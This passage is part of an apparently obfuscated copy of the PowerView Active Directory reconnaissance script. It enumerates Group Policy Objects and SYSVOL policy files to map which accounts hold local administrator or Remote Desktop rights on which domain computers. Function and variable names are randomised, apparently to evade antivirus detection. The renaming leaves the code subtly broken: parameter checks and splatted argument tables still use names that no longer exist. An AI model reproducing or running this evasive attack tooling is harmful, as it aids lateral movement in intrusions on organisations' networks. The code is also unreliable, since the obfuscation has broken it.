                }
                else {
                    $nlvvSWoK99['Identity'] = $CgAKgSWG99
                    $User = asseverate @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[straights] User '$CgAKgSWG99' not found!"
                    }
                    $PpMDEFqG99 = $User.distinguishedname
                }

                $yEDdYDXk99 = @()
                $yEDdYDXk99 += $PpMDEFqG99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $PpMDEFqG99.SubString($PpMDEFqG99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[straights] object OUs: $yEDdYDXk99"

                if ($yEDdYDXk99) {
                    $nlvvSWoK99.Remove('Properties')
                    $vfFLtdsS99 = $False
                    ForEach($INCJaqmO99 in $yEDdYDXk99) {
                        $nlvvSWoK99['Identity'] = $INCJaqmO99
                        $tgunRFvL99 += bulldog @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $ViZMcsNn99 = $Parts[1]

                                        if ($vfFLtdsS99) {
                                            if ($ViZMcsNn99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            if ($_.gpoptions -eq 1) {
                                $vfFLtdsS99 = $True
                            }
                        }
                    }
                }

                if ($bvgoxpSV99) {
                    $DDrSCjUA99 = (slobbering -ComputerName $bvgoxpSV99).SiteName
                    if($DDrSCjUA99 -and ($DDrSCjUA99 -notlike 'Error*')) {
                        $nlvvSWoK99['Identity'] = $DDrSCjUA99
                        $tgunRFvL99 += regenerate @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                $wXpGeFef99 = $PpMDEFqG99.SubString($PpMDEFqG99.IndexOf('DC='))
                $nlvvSWoK99.Remove('Identity')
                $nlvvSWoK99.Remove('Properties')
                $nlvvSWoK99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$wXpGeFef99)"
                $tgunRFvL99 += nostrums @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[straights] GPOAdsPaths: $tgunRFvL99"

                if ($wkdNSvfa99) { $nlvvSWoK99['Properties'] = $wkdNSvfa99 }
                else { $nlvvSWoK99.Remove('Properties') }
                $nlvvSWoK99.Remove('Identity')

                $tgunRFvL99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $nlvvSWoK99['SearchBase'] = $_
                    $nlvvSWoK99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    nostrums @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $OfuxkWWH99 = ''
                $HLDsNhab99 = ''
                $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                    $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($svVwDJqZ99 -match 'LDAP://|^CN=.*') {
                        $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[straights] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                            $nlvvSWoK99['Domain'] = $QaLnxLKT99
                            $krAaRgdg99 = misbehaves @SearcherArguments
                            if (-not $krAaRgdg99) {
                                Write-Warning "[straights] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                            }
                        }
                    }
                    elseif ($svVwDJqZ99 -match '{.*}') {
                        $OfuxkWWH99 += "(name=$svVwDJqZ99)"
                    }
                    else {
                        try {
                            $TsiMgfqm99 = (-Join (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                        }
                        catch {
                            $OfuxkWWH99 += "(displayname=$svVwDJqZ99)"
                        }
                    }
                }
                if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                    $HLDsNhab99 += "(|$OfuxkWWH99)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[straights] Using additional LDAP filter: $NzjfVMfT99"
                    $HLDsNhab99 += "$NzjfVMfT99"
                }

                $krAaRgdg99.filter = "(&(objectCategory=groupPolicyContainer)$HLDsNhab99)"
                Write-Verbose "[straights] filter string: $($krAaRgdg99.filter)"

                if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $krAaRgdg99.FindOne() }
                else { $DEbeunXw99 = $krAaRgdg99.FindAll() }
                $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($pQbfmzwr99 -Match '^GC://')) {
                            $GPO = Jagger -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $kwOyiSAb99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $vaUbjNtH99 = "\\$kwOyiSAb99\SysVol\$kwOyiSAb99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $vaUbjNtH99
                            }
                            catch {
                                Write-Verbose "[straights] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Jagger -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($DEbeunXw99) {
                    try { $DEbeunXw99.dispose() }
                    catch {
                        Write-Verbose "[straights] Error disposing of the Results object: $_"
                    }
                }
                $krAaRgdg99.dispose()
            }
        }
    }
}


function giggliest {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $lmPsrtYT99,

        [Switch]
        $vckVgVSH99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $JXWXuoyG99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        $lCBnsyFH99 = @{}
        if ($PSBoundParameters['Domain']) { $lCBnsyFH99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $lCBnsyFH99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Credential']) { $lCBnsyFH99['Credential'] = $tYWiEqAT99 }

        $JbImTJln99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $nlvvSWoK99['Identity'] = $lmPsrtYT99 }

        straights @SearcherArguments | ForEach-Object {
            $acoDszYj99 = $_.displayname
            $fGAxBqUK99 = $_.name
            $iFkAtSya99 = $_.gpcfilesyspath

            $rYDqVpFt99 =  @{ 'GptTmplPath' = "$iFkAtSya99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $rYDqVpFt99['Credential'] = $tYWiEqAT99 }

            $Inf = Casandra @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $MyqwnsoX99 = @{}

                ForEach ($rnszWdCd99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $eLBqvbTe99 = $rnszWdCd99.Key.Split('__', $JbImTJln99) | ForEach-Object {$_.Trim()}
                    $uJVPyDMa99 = $rnszWdCd99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $xkbQuxdq99 = @()
                        ForEach ($VoXrAEUj99 in $uJVPyDMa99) {
                            if ($VoXrAEUj99 -and ($VoXrAEUj99.Trim() -ne '')) {
                                if ($VoXrAEUj99 -notmatch '^S-1-.*') {
                                    $sdqOqaiO99 = @{'ObjectName' = $VoXrAEUj99}
                                    if ($PSBoundParameters['Domain']) { $sdqOqaiO99['Domain'] = $JXWXuoyG99 }
                                    $zxYTkuyV99 = nonstick @ConvertToArguments

                                    if ($zxYTkuyV99) {
                                        $xkbQuxdq99 += $zxYTkuyV99
                                    }
                                    else {
                                        $xkbQuxdq99 += $VoXrAEUj99
                                    }
                                }
                                else {
                                    $xkbQuxdq99 += $VoXrAEUj99
                                }
                            }
                        }
                        $uJVPyDMa99 = $xkbQuxdq99
                    }

                    if (-not $MyqwnsoX99[$Group]) {
                        $MyqwnsoX99[$Group] = @{}
                    }
                    if ($uJVPyDMa99 -isnot [System.Array]) {$uJVPyDMa99 = @($uJVPyDMa99)}
                    $MyqwnsoX99[$Group].Add($eLBqvbTe99, $uJVPyDMa99)
                }

                ForEach ($rnszWdCd99 in $MyqwnsoX99.GetEnumerator()) {
                    if ($rnszWdCd99 -and $rnszWdCd99.Key -and ($rnszWdCd99.Key -match '^\*')) {
                        $CpfORWIL99 = $rnszWdCd99.Key.Trim('*')
                        if ($CpfORWIL99 -and ($CpfORWIL99.Trim() -ne '')) {
                            $owBLZLPg99 = recollection -ObjectSID $CpfORWIL99 @ConvertArguments
                        }
                        else {
                            $owBLZLPg99 = $False
                        }
                    }
                    else {
                        $owBLZLPg99 = $rnszWdCd99.Key

                        if ($owBLZLPg99 -and ($owBLZLPg99.Trim() -ne '')) {
                            if ($owBLZLPg99 -match 'Administrators') {
                                $CpfORWIL99 = 'S-1-5-32-544'
                            }
                            elseif ($owBLZLPg99 -match 'Remote Desktop') {
                                $CpfORWIL99 = 'S-1-5-32-555'
                            }
                            elseif ($owBLZLPg99 -match 'Guests') {
                                $CpfORWIL99 = 'S-1-5-32-546'
                            }
                            elseif ($owBLZLPg99.Trim() -ne '') {
                                $sdqOqaiO99 = @{'ObjectName' = $owBLZLPg99}
                                if ($PSBoundParameters['Domain']) { $sdqOqaiO99['Domain'] = $JXWXuoyG99 }
                                $CpfORWIL99 = nonstick @ConvertToArguments
                            }
                            else {
                                $CpfORWIL99 = $Null
                            }
                        }
                    }

                    $voxaSicY99 = New-Object PSObject
                    $voxaSicY99 | Add-Member Noteproperty 'GPODisplayName' $acoDszYj99
                    $voxaSicY99 | Add-Member Noteproperty 'GPOName' $fGAxBqUK99
                    $voxaSicY99 | Add-Member Noteproperty 'GPOPath' $iFkAtSya99
                    $voxaSicY99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $voxaSicY99 | Add-Member Noteproperty 'Filters' $Null
                    $voxaSicY99 | Add-Member Noteproperty 'GroupName' $owBLZLPg99
                    $voxaSicY99 | Add-Member Noteproperty 'GroupSID' $CpfORWIL99
                    $voxaSicY99 | Add-Member Noteproperty 'GroupMemberOf' $rnszWdCd99.Value.Memberof
                    $voxaSicY99 | Add-Member Noteproperty 'GroupMembers' $rnszWdCd99.Value.Members
                    $voxaSicY99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $voxaSicY99
                }
            }

            $rYDqVpFt99 =  @{
                'GroupsXMLpath' = "$iFkAtSya99\MACHINE\Preferences\Groups\Groups.xml"
            }

            elementary @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $xkbQuxdq99 = @()
                    ForEach ($VoXrAEUj99 in $_.GroupMembers) {
                        if ($VoXrAEUj99 -and ($VoXrAEUj99.Trim() -ne '')) {
                            if ($VoXrAEUj99 -notmatch '^S-1-.*') {

                                $sdqOqaiO99 = @{'ObjectName' = $owBLZLPg99}
                                if ($PSBoundParameters['Domain']) { $sdqOqaiO99['Domain'] = $JXWXuoyG99 }
                                $zxYTkuyV99 = nonstick -Domain $JXWXuoyG99 -ObjectName $VoXrAEUj99

                                if ($zxYTkuyV99) {
                                    $xkbQuxdq99 += $zxYTkuyV99
                                }
                                else {
                                    $xkbQuxdq99 += $VoXrAEUj99
                                }
                            }
                            else {
                                $xkbQuxdq99 += $VoXrAEUj99
                            }
                        }
                    }
                    $_.GroupMembers = $xkbQuxdq99
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $acoDszYj99
                $_ | Add-Member Noteproperty 'GPOName' $fGAxBqUK99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function venerate {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $lmPsrtYT99,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $MSSeuaLN99 = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $fOdHQpyN99 = @{}
        if ($PSBoundParameters['Domain']) { $fOdHQpyN99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $fOdHQpyN99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $fOdHQpyN99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $fOdHQpyN99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $fOdHQpyN99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $fOdHQpyN99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $fOdHQpyN99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        $iKMyoKyv99 = @()

        if ($PSBoundParameters['Identity']) {
            $iKMyoKyv99 += nostrums @CommonArguments -Identity $lmPsrtYT99 | Select-Object -Expand objectsid
            $llaczhze99 = $iKMyoKyv99
            if (-not $iKMyoKyv99) {
                Throw "[venerate] Unable to retrieve SID for identity '$lmPsrtYT99'"
            }
        }
        else {
            $iKMyoKyv99 = @('*')
        }

        if ($MSSeuaLN99 -match 'S-1-5') {
            $jrpFyWhp99 = $MSSeuaLN99
        }
        elseif ($MSSeuaLN99 -match 'Admin') {
            $jrpFyWhp99 = 'S-1-5-32-544'
        }
        else {
            $jrpFyWhp99 = 'S-1-5-32-555'
        }

        if ($iKMyoKyv99[0] -ne '*') {
            ForEach ($KNzOOYde99 in $iKMyoKyv99) {
                Write-Verbose "[venerate] Enumerating nested group memberships for: '$KNzOOYde99'"
                $iKMyoKyv99 += walnuts @CommonArguments -Properties 'objectsid' -MemberIdentity $KNzOOYde99 | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[venerate] Target localgroup SID: $jrpFyWhp99"
        Write-Verbose "[venerate] Effective target domain SIDs: $iKMyoKyv99"

        $dYEbvHGR99 = giggliest @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $voxaSicY99 = $_
            if ($voxaSicY99.GroupSID -match $jrpFyWhp99) {
                $voxaSicY99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($iKMyoKyv99[0] -eq '*') -or ($iKMyoKyv99 -Contains $_) ) {
                        $voxaSicY99
                    }
                }
            }
            if ( ($voxaSicY99.GroupMemberOf -contains $jrpFyWhp99) ) {
                if ( ($iKMyoKyv99[0] -eq '*') -or ($iKMyoKyv99 -Contains $voxaSicY99.GroupSID) ) {
                    $voxaSicY99
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $dYEbvHGR99 | Where-Object {$_} | ForEach-Object {
            $fGAxBqUK99 = $_.GPODisplayName
            $FLMntppT99 = $_.GPOName
            $iFkAtSya99 = $_.GPOPath
            $ssxkTORn99 = $_.GPOType
            if ($_.GroupMembers) {
                $rZjSBErx99 = $_.GroupMembers
            }
            else {
                $rZjSBErx99 = $_.GroupSID
            }

            $GksFLwoy99 = $_.Filters

            if ($iKMyoKyv99[0] -eq '*') {
                $qqzTLVZv99 = $rZjSBErx99
            }
            else {
                $qqzTLVZv99 = $llaczhze99
            }

            bulldog @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $FLMntppT99 | ForEach-Object {
                if ($GksFLwoy99) {
                    $MGJrxiFv99 = undergrad @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($GksFLwoy99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $MGJrxiFv99 = undergrad @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($MGJrxiFv99) {
                    if ($MGJrxiFv99 -isnot [System.Array]) {$MGJrxiFv99 = @($MGJrxiFv99)}

                    ForEach ($KNzOOYde99 in $qqzTLVZv99) {
                        $Object = nostrums @CommonArguments -Identity $KNzOOYde99 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $hojuGiPZ99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $vgiFeqHd99 = New-Object PSObject
                        $vgiFeqHd99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $vgiFeqHd99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $vgiFeqHd99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $vgiFeqHd99 | Add-Member Noteproperty 'Domain' $JXWXuoyG99
                        $vgiFeqHd99 | Add-Member Noteproperty 'IsGroup' $hojuGiPZ99
                        $vgiFeqHd99 | Add-Member Noteproperty 'GPODisplayName' $fGAxBqUK99
                        $vgiFeqHd99 | Add-Member Noteproperty 'GPOGuid' $FLMntppT99
                        $vgiFeqHd99 | Add-Member Noteproperty 'GPOPath' $iFkAtSya99
                        $vgiFeqHd99 | Add-Member Noteproperty 'GPOType' $ssxkTORn99
                        $vgiFeqHd99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $vgiFeqHd99 | Add-Member Noteproperty 'ComputerName' $MGJrxiFv99
                        $vgiFeqHd99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $vgiFeqHd99
                    }
                }
            }

            regenerate @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $FLMntppT99 | ForEach-Object {
                ForEach ($KNzOOYde99 in $qqzTLVZv99) {
                    $Object = nostrums @CommonArguments -Identity $KNzOOYde99 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $hojuGiPZ99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $vgiFeqHd99 = New-Object PSObject
                    $vgiFeqHd99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $vgiFeqHd99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $vgiFeqHd99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $vgiFeqHd99 | Add-Member Noteproperty 'IsGroup' $hojuGiPZ99
                    $vgiFeqHd99 | Add-Member Noteproperty 'Domain' $JXWXuoyG99
                    $vgiFeqHd99 | Add-Member Noteproperty 'GPODisplayName' $fGAxBqUK99
                    $vgiFeqHd99 | Add-Member Noteproperty 'GPOGuid' $FLMntppT99
                    $vgiFeqHd99 | Add-Member Noteproperty 'GPOPath' $iFkAtSya99
                    $vgiFeqHd99 | Add-Member Noteproperty 'GPOType' $ssxkTORn99
                    $vgiFeqHd99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $vgiFeqHd99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $vgiFeqHd99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $vgiFeqHd99
                }
            }
        }
    }
}


function petrolatum {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $EzsLgvcu99,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $papOSvlJ99,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $MSSeuaLN99 = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $fOdHQpyN99 = @{}
        if ($PSBoundParameters['Domain']) { $fOdHQpyN99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $fOdHQpyN99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $fOdHQpyN99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $fOdHQpyN99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $fOdHQpyN99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $fOdHQpyN99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $fOdHQpyN99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $dzsNhpcT99 = undergrad @CommonArguments -Identity $EzsLgvcu99 -Properties 'distinguishedname,dnshostname'

            if (-not $dzsNhpcT99) {
                throw "[petrolatum] Computer $EzsLgvcu99 not found. Try a fully qualified host name."
            }

            ForEach ($BoJggNks99 in $dzsNhpcT99) {

                $dmjvShpT99 = @()

                $DN = $BoJggNks99.distinguishedname
                $PNxMtETu99 = $DN.IndexOf('OU=')
                if ($PNxMtETu99 -gt 0) {
                    $BZvMGcKS99 = $DN.SubString($PNxMtETu99)
                }
                if ($BZvMGcKS99) {
                    $dmjvShpT99 += bulldog @CommonArguments -SearchBase $BZvMGcKS99 -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                Write-Verbose "Enumerating the sitename for: $($BoJggNks99.dnshostname)"
                $DDrSCjUA99 = (slobbering -ComputerName $BoJggNks99.dnshostname).SiteName
                if ($DDrSCjUA99 -and ($DDrSCjUA99 -notmatch 'Error')) {
                    $dmjvShpT99 += regenerate @CommonArguments -Identity $DDrSCjUA99 -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                $dmjvShpT99 | giggliest @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $voxaSicY99 = $_

                    if($voxaSicY99.GroupMembers) {
                        $rZjSBErx99 = $voxaSicY99.GroupMembers
                    }
                    else {
                        $rZjSBErx99 = $voxaSicY99.GroupSID
                    }

                    $rZjSBErx99 | ForEach-Object {
                        $Object = nostrums @CommonArguments -Identity $_
                        $hojuGiPZ99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $BmIiyken99 = New-Object PSObject
                        $BmIiyken99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99.dnshostname
                        $BmIiyken99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $BmIiyken99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $BmIiyken99 | Add-Member Noteproperty 'ObjectSID' $_
                        $BmIiyken99 | Add-Member Noteproperty 'IsGroup' $hojuGiPZ99
                        $BmIiyken99 | Add-Member Noteproperty 'GPODisplayName' $voxaSicY99.GPODisplayName
                        $BmIiyken99 | Add-Member Noteproperty 'GPOGuid' $voxaSicY99.GPOName
                        $BmIiyken99 | Add-Member Noteproperty 'GPOPath' $voxaSicY99.GPOPath
                        $BmIiyken99 | Add-Member Noteproperty 'GPOType' $voxaSicY99.GPOType
                        $BmIiyken99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $BmIiyken99
                    }
                }
            }
        }
    }
}


function soirée {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $UvnpvCNS99 = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        $lCBnsyFH99 = @{}
        if ($PSBoundParameters['Server']) { $lCBnsyFH99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Credential']) { $lCBnsyFH99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
